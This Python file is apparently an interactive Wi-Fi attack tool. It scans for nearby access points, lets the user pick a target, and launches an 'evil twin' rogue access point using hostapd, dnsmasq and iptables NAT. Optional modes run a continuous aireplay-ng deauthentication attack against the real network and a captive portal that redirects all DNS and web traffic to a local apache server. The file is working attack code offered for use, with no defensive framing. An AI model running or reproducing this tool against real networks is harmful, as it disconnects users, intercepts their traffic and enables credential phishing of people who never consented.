import os
import signal
import subprocess
import time
import re

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
selected_interface = ''
selected_interface_mac_address = ''
physical_number_of_interface = ''
virtual_monitor_interface = ''
internet_facing_interface = ''
target_ap = ''
target_bssid = ''
target_channel = ''
terminal_pids = []
terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
                      (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left

def get_screen_resolution():
    output = check_output("xdpyinfo | grep dimensions")
    resolution = output.split()[1].split('x')
    return int(resolution[0]), int(resolution[1])


def red(string):
    return f'\033[91m{string}\033[0m'


def green(string):
    return f'\033[92m{string}\033[0m'


def purple(string):
    return f'\033[95m{string}\033[0m'


def yellow(string):
    return f'\033[33m{string}\033[0m'


def blue(string):
    return f'\033[34m{string}\033[0m'


def magenta(string):
    return f'\033[35m{string}\033[0m'


def cyan(string):
    return f'\033[36m{string}\033[0m'


def white(string):
    return f'\033[37m{string}\033[0m'


def clear():
    subprocess.run('clear')


def run_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        return result.stdout
    else:
        return result.stderr


def run_command_print_output(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print(f"Command: {command}")
    if result.returncode == 0:
        print(f"{green('Output')}   :   " + result.stdout)
        print("-" * 30)
        return result.stdout
    else:
        print(f"{red('Error')}      :   " + result.stderr)
        print("-" * 30)
        return result.stderr


def popen_command(command, killtime=0):
    print(f'running {command} for {killtime} seconds')
    process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
    if killtime:
        print(yellow(f'if process does not finish in {killtime} seconds, press enter to kill it'))
        time.sleep(killtime)
        os.killpg(process.pid, signal.SIGTERM)
        process.wait()
        output, error = process.communicate()
        output = output.decode('latin1')  # sometimes airodump output causes issues with utf-8
        error = error.decode('latin1')
        return output, error


def popen_command_new_terminal(command):
    for terminal in terminals:
        screen_width, screen_height = get_screen_resolution()
        terminal_width = screen_width // 2
        terminal_height = screen_height // 3

        try:
            if terminal == 'x-terminal-emulator':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} -geometry {terminal_width}x{terminal_height}+{x}+{y} -e 'bash -c \"{command}; exec bash\"'"
            elif terminal == 'gnome-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'konsole':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'xfce4-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            else:  # xterm
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            print(f"Executing command: {terminal_command}\n")
            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid)
            terminal_pids.append(process.pid)
            return process

        except Exception as e:
            print(f"Failed to execute command in {terminal}: {e} \n")


def check_output(command):
    output = subprocess.check_output(command, shell=True, text=True)
    return output


def change_interface():
    global selected_interface
    print("Available Network Interfaces: \n")
    interfaces = run_command("iw dev | grep Interface | awk '{print $2}'").split('\n')
    select_with_number = []
    interface_count = 0
    for intf in interfaces:
        if intf != '':
            interface_count += 1
            select_with_number.append([interface_count, intf])
            print(f'{green(select_with_number[interface_count - 1][0])}) {select_with_number[interface_count - 1][1]}')
    while True:
        selection = input(f"\nEnter the number of the interface {green('(type exit to return)')} : ")
        if selection.lower() == 'exit':
            break
        elif selection.isnumeric():
            if interface_count >= int(selection) > 0:
                selected_interface = select_with_number[int(selection) - 1][1]
                get_physical_number_of_interface()
                get_mac_of_interface(selected_interface)
                break
            elif int(selection) > interface_count:
                print(f'Selected interface ({selection}) {red("does not exist")}')


def change_internet_facing_interface():
    global internet_facing_interface
    print("Available Network Interfaces: \n")
    interfaces = run_command("ip link show | grep UP | awk -F: '{print $2}'").split('\n')
    select_with_number = []
    interface_count = 0
    for intf in interfaces:
        intf = intf.strip()
        if intf != '' and intf != selected_interface:
            interface_count += 1
            select_with_number.append([interface_count, intf])
            print(f'{green(select_with_number[interface_count - 1][0])}) {select_with_number[interface_count - 1][1]}')
    while True:
        selection = input(f"\nEnter the number of the interface {green('(type exit to return)')} : ")
        if selection.lower() == 'exit':
            break
        if selection.isnumeric():
            if interface_count >= int(selection) > 0:
                internet_facing_interface = select_with_number[int(selection) - 1][1]
                break
            elif int(selection) > interface_count:
                print(f'Selected interface ({selection}) {red("does not exist")}')


def is_interface_monitor():
    interface_settings = run_command(f'iwconfig {selected_interface}')
    if 'monitor' in interface_settings.lower():
        return True
    else:
        return False


def get_mac_of_interface(interface=selected_interface):
    global selected_interface_mac_address
    output = run_command(f'ip link show {interface}')
    mac_address_search = re.search(r'link/\S+ (\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', output)
    if mac_address_search:
        selected_interface_mac_address = mac_address_search.group(1)
    else:
        print(f'error with {magenta("get_mac_of_interface")}')


def switch_interface_to_monitor_mode(interface=selected_interface):
    print('Setting ' + interface + ' to monitor mode ')
    run_command(f'ifconfig {interface} down')
    run_command(f'iwconfig {interface} mode monitor')
    run_command(f'ifconfig {interface} up')


def switch_interface_to_managed_mode(interface=selected_interface):
    print('Setting ' + interface + ' to managed mode ')
    run_command(f'ifconfig {interface} down')
    run_command(f'iwconfig {interface} mode managed')
    run_command(f'ifconfig {interface} up')


def switch_interface_channel(interface=selected_interface):
    run_command_print_output(f'iwconfig {interface} channel {target_channel}')
    print(f'{green(interface)} set to channel {target_channel}')


def select_target_ap():
    global target_ap
    global target_bssid
    global target_channel
    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=7)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
        end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
        end_index = output.rfind(end_pattern)
        start_index = output.rfind(start_pattern, 0, end_index)
        if end_index == -1 or start_index == -1:
            print('unknown pattern error 1')
            return
        else:
            output = output[start_index:end_index]
        SSIDS = []
        ssid_counter = 0
        ssids_print_list = []
        for row in output.split('\n'):
            column = row.split()
            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
                ssid_counter += 1
                SSIDS.append([ssid_counter, column[10]])
                # print(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]}')
                ssids_print_list.append(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]}')
        print('\n==================================================================================================\n')
        while 1:
            for i in ssids_print_list:
                print(i)
            print('\nif desired SSID is not listed, please return and scan again.')
            selection = input(f"\nEnter the number of the SSID {green('(type exit to return)')} : ")
            if selection == 'exit':
                break
            elif selection.isnumeric():
                if ssid_counter >= int(selection) > 0:
                    target_ap = SSIDS[int(selection) - 1][1]
                    while 1:
                        try:
                            target_bssid, target_channel = get_bssid_and_station_from_ap()
                            return
                        except TypeError:
                            if input(f'\n\n{green("Press Enter to retry : ")}').lower() != '':
                                target_ap = ''
                                return
                    return
                elif int(selection) > ssid_counter:
                    print(f'Selected interface ({selection}) {red("does not exist")}')
    else:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')


def get_bssid_and_station_from_ap():
    clear()
    print(f'Gathering Information on {target_ap}')
    output, error = popen_command(f'airodump-ng -N {target_ap} {selected_interface}', killtime=3)
    if 'Failed initializing wireless card(s)' in output:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
        return
    elif target_ap not in output:
        print(
            f'Scan was successful but {green(target_ap)} is {red("not found")}.')
        return
    else:
        for column in output.split('\n'):
            row = column.split()
            if row[-2] and row[1]:
                if row[-2] == target_ap and len(row[1]) == 17:
                    return row[1], row[6]


def create_file_in_tmp(file, content):
    """
    :param file: full name of the file to be created with extension
        ex : dnsmasq.config
    :param content: list of string
        ex : content = [
            'text',
            'text',
            'text',
            'text',
            ]
    :return:
    """
    location = f'/tmp/{file}'
    with open(location, 'w') as new_file:
        for line in content:
            new_file.write(line + "\n")
    print(f'{green(file)} created at {green(location)}')


def apache2():
    print(magenta('running apache2'))

    html_location = './captive_portal_html/{}'
    html_destination = '/var/www/html/{}'
    config_destination = '/etc/apache2/sites-enabled/{}'

    # run_command_print_output(f"cp -r {html_location.format('temp')} {html_destination.format('temp')}")
    # run_command_print_output(f"cp -r {html_location.format('android')} {html_destination.format('android')}")
    # run_command(f"cp {config_location.format('android.config')} {config_destination.format('android.config')}")

    # run_command(f"cp {config_location.format('000-default.conf')} /etc/apache2/sites-available/temp.conf")
    run_command_print_output('systemctl start apache2')
    run_command_print_output(
        f"cp {html_location.format('000-default.conf')} /etc/apache2/sites-available/000-default.conf")
    # create_html_page()
    # run_command_print_output('cp ./html.index /var/www/html/temp/index.html')
    # run_command_print_output('cp ./password.php /var/www/html/temp/password.php')

    run_command_print_output('systemctl restart apache2')


def dnsmasq(captive_portal=False):
    conf_content = [
         f'interface={selected_interface}',
         "log-queries",
         "log-dhcp",
         "dhcp-range=192.168.10.10,192.168.10.250,255.255.255.0,12h",
         "dhcp-option=3,192.168.10.1",
         "dhcp-option=6,192.168.10.1",
         "listen-address=127.0.0.1,192.168.10.1",
         "server=8.8.8.8",
         f"except-interface={internet_facing_interface}",
        # f'address=/#/192.168.10.1'
    ]
    if captive_portal:
        print(magenta('running dnsmasq config with captive_portal'))
        conf_content = [
            f'interface={selected_interface}',
            "log-queries",
            "log-dhcp",
            "dhcp-range=192.168.10.10,192.168.10.250,255.255.255.0,12h",
            "dhcp-option=3,192.168.10.1",  # Default Gateway
            "dhcp-option=6,192.168.10.1",  # DNS Server
            "listen-address=127.0.0.1,192.168.10.1",
            "server=8.8.8.8",  # Upstream DNS
            f"except-interface={internet_facing_interface}",
            "address=/#/192.168.10.1"  # Redirect all domains to the captive portal IP
        ]
    create_file_in_tmp('dnsmasq.conf', conf_content)
    popen_command_new_terminal('dnsmasq -C /tmp/dnsmasq.conf -d')


def hostapd(captive_portal=False):
    global target_ap
    global target_channel
    conf_content = [
        f'interface={selected_interface}',
        f'driver=nl80211',
        f'ssid={target_ap}-2',
        f'hw_mode=g',
        f'channel={target_channel}',
        f'wmm_enabled=0',
        f'macaddr_acl=0',
        f'auth_algs=1',
        f'ignore_broadcast_ssid=0',
    ]
    if captive_portal:
        print(magenta('running hostapd config with captive_portal'))
        conf_content = [
            f'interface={selected_interface}',
            f'driver=nl80211',
            f'ssid={target_ap}-FreeWifi',
            f'hw_mode=g',
            f'channel={target_channel}',
            f'wmm_enabled=0',
            f'macaddr_acl=0',
            f'auth_algs=1',
            f'ignore_broadcast_ssid=0',
        ]
    create_file_in_tmp('hostapd.conf', conf_content)
    popen_command_new_terminal(f'hostapd /tmp/hostapd.conf')


def forwarding(captive_portal=False):
    run_command_print_output('airmon-ng check kill')
    switch_interface_to_monitor_mode()
    run_command_print_output('echo 1 > /proc/sys/net/ipv4/ip_forward')
    run_command_print_output(f'ip addr add 192.168.10.1/24 dev {selected_interface}')
    run_command_print_output(f'iptables -t nat -A POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command_print_output(f'iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command_print_output(f'iptables -A FORWARD -i {selected_interface} -o {internet_facing_interface} -j ACCEPT')
    if captive_portal:
        print(magenta('running forwarding with captive_portal'))
        run_command_print_output(
            f'iptables -t nat -A PREROUTING -i {selected_interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80')
        run_command(
            f'iptables -t nat -A PREROUTING -i {selected_interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443')
        run_command_print_output(f'iptables -A FORWARD -p tcp -d 192.168.10.1 --dport 80 -j ACCEPT')
        run_command_print_output(f'iptables -t nat -A POSTROUTING -j MASQUERADE')


def aireplay(interface=selected_interface, attack_type=None):
    """
    https://www.aircrack-ng.org/doku.php?id=aireplay-ng#fragmentation

    attacks types:
        1 : Deauthentication     : https://www.aircrack-ng.org/doku.php?id=deauthentication
        2 : Fake authentication  : https://www.aircrack-ng.org/doku.php?id=fake_authentication
        3 : Korek chopchop       : https://www.aircrack-ng.org/doku.php?id=korek_chopchop
        4 : Fragmentation        : https://www.aircrack-ng.org/doku.php?id=fragmentation
        5 : Caffe Latte          : https://www.aircrack-ng.org/doku.php?id=cafe-latte
        6 : Hirte                : https://www.aircrack-ng.org/doku.php?id=hirte
    """
    switch_interface_channel(interface=interface)
    if attack_type == 'deauthentication':
        print('Running Deauthentication attack')
        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')
def get_physical_number_of_interface():
    global physical_number_of_interface

    output = check_output('iw dev')
    lines = output.split('\n')
    phy_number = ''
    for i, line in enumerate(lines):
        if f"Interface {selected_interface}" in line:
            # Look backwards for the most recent phy# line
            for j in range(i, -1, -1):
                if lines[j].startswith('phy#'):
                    phy_line = lines[j]
                    phy_number = phy_line.strip().split('#')[1]
                    break
            break

    physical_number_of_interface = f'phy{phy_number}'


def create_virtual_monitor_interface():
    global virtual_monitor_interface

    virtual_monitor_interface = selected_interface + 'clone'  # monitor interface from main interface to be used in aireplay-ng since we cant use wlan0 for both hostapds and aireplay at the same time

    run_command_print_output(
        f'iw {physical_number_of_interface} interface add {virtual_monitor_interface} type monitor')
    run_command_print_output(f'ip link set {virtual_monitor_interface} up')


def evil_twin(captive_portal=False, attack_type=None):
    if captive_portal:
        print(magenta('running rogue_ap with captive_portal'))
        apache2()
        forwarding(captive_portal=True)
        hostapd(captive_portal=True)
        dnsmasq(captive_portal=True)
    else:
        print(magenta('running rogue_ap without captive_portal'))
        forwarding()
        dnsmasq()
        hostapd()
    if attack_type:
        create_virtual_monitor_interface()
        if attack_type == 'deauthentication':
            aireplay(interface=virtual_monitor_interface, attack_type='deauthentication')
    input(f'\n\n{green("Press Enter to Quit : ")}')
    close(captive_portal=captive_portal)


def close(captive_portal=False):
    global terminal_pids
    clear()
    print(
        f"RULES/CONFIGURATIONS ARE BEING REVERTED. {red('DO NOT CANCEL')} THIS PROCESS OR YOUR NETWORK CONNECTION MAY NOT WORK AS EXPECTED")

    if virtual_monitor_interface:
        run_command_print_output(f'iw {virtual_monitor_interface} del')
    for pid in terminal_pids:
        os.kill(pid, signal.SIGTERM)
    terminal_pids = []
    run_command_print_output('killall aireplay-ng')
    run_command_print_output('killall hostapd')
    run_command_print_output('killall dnsmasq')
    run_command_print_output('killall apache2')
    run_command_print_output(f'systemctl stop apache2')
    run_command_print_output(f'systemctl stop dnsmasq')
    run_command_print_output(f'dhclient -r {selected_interface}')  # resets interface ip to original
    # remove forwarding rules
    run_command_print_output("iptables --flush")
    run_command_print_output("iptables --flush -t nat")
    run_command_print_output("iptables --delete-chain")
    run_command_print_output("iptables --table nat --delete-chain")
    run_command_print_output('echo 0 > /proc/sys/net/ipv4/ip_forward')
    run_command_print_output(f'iptables -t nat -D POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command_print_output(f'iptables -D FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command_print_output(f'iptables -D FORWARD -i {selected_interface} -o {internet_facing_interface} -j ACCEPT')
    run_command_print_output(f'killall dhclient')
    run_command_print_output(f'systemctl restart NetworkManager')
    if captive_portal:
        # remove apache() rules
        # Delete the PREROUTING rule for port 80:
        run_command_print_output(
            f'iptables -t nat -D PREROUTING -i {selected_interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80')
        # Delete the PREROUTING rule for port 443:
        run_command_print_output(
            f'iptables -t nat -D PREROUTING -i {selected_interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443')
        # Delete the FORWARD rule for port 80:
        run_command_print_output(f'iptables -D FORWARD -p tcp -d 192.168.10.1 --dport 80 -j ACCEPT')


def main_options():
    for options in main_options:
        print(options)


def mitm_options():
    for options in mitm_options:
        print(options)


main = ['main', main_options]
mitm = ['mitm', mitm_options]

section = main
prev_section = main

if __name__ == "__main__":
    while 1:
        clear()

        main_options = [
            f'{blue("-------------------------------------------------------")}',
            f'{green("1)")} Select Monitor Interface',
            f'{green("2)")} Select Internet Facing Interface',
            f'{blue("-------------------------------------------------------")}',
            f'Monitor Interface           : {cyan(selected_interface)} at {cyan(physical_number_of_interface)}',
            f'Internet Facing Interface   : {cyan(internet_facing_interface)}',
            f'Monitor Interface MAC       : {cyan(selected_interface_mac_address)}',
            f'{blue("-------------------------------------------------------")}',
            f'{green("A)")} MITM ATTACKS',
            f'{blue("-------------------------------------------------------")}',
        ]
        mitm_options = [
            f'{blue("-------------------------------------------------------")}',
            f'{green("I")}      Interface Selection',
            f'{blue("-------------------------------------------------------")}',
            f'{green("T)")}     Select a Target',
            f'{blue("-------------------------------------------------------")}',
            f'{green("E)")}     Evil Twin',
            f'{green("ED)")}    Evil Twin w/ Deauthentication attack',
            f'{green("EC)")}    Evil Twin w/ Captive Portal',
            f'{blue("-------------------------------------------------------")}',
            f'Monitor Interface           : {cyan(selected_interface)}',
            f'Internet Facing Interface   : {cyan(internet_facing_interface)}',
            f'{blue("-------------------------------------------------------")}',
            f'Target SSID                 : {cyan(target_ap)}',
            f'Target MAC                  : {cyan(target_bssid)}',
            f'Target CHANNEL              : {cyan(target_channel)}',
            f'{blue("-------------------------------------------------------")}',

        ]
        section[1]()
        match input('\nmitm > ').upper():
            case '1':
                if section[0] == 'main':
                    change_interface()
            case '2':
                if section[0] == 'main' and selected_interface == '':
                    selection = input('select monitor mode interface first Y/N,').lower().split()
                    if selection == 'y':
                        change_interface()
                elif section[0] == 'main':
                    change_internet_facing_interface()
                elif section[0] == 'mitm':
                    change_internet_facing_interface()
            case 'A':
                if selected_interface == '':
                    if input("Select a interface to continue y/n").lower() == 'y':
                        change_interface()
                elif internet_facing_interface == '':
                    if input("Select a internet facing interface to continue y/n").lower() == 'y':
                        change_internet_facing_interface()
                else:
                    prev_section = section
                    section = mitm
            case 'I':
                if section[0] == 'mitm':
                    prev_section = section
                    section = main
            case 'T':
                if section[0] == 'mitm':
                    select_target_ap()
            case 'E':
                if section[0] == 'mitm' and target_bssid == '':
                    if input("Select a target to continue y/n").lower() == 'y':
                        select_target_ap()
                elif section[0] == 'mitm':
                    evil_twin()
            case 'ED':
                if section[0] == 'mitm' and target_bssid == '':
                    if input("Select a target to continue y/n").lower() == 'y':
                        select_target_ap()
                elif section[0] == 'mitm':
                    evil_twin(attack_type='deauthentication')
            case 'EC':
                if section[0] == 'mitm' and target_bssid == '':
                    if input("Select a target to continue y/n").lower() == 'y':
                        select_target_ap()
                if section[0] == 'mitm':
                    evil_twin(captive_portal=True, attack_type='deauthentication')
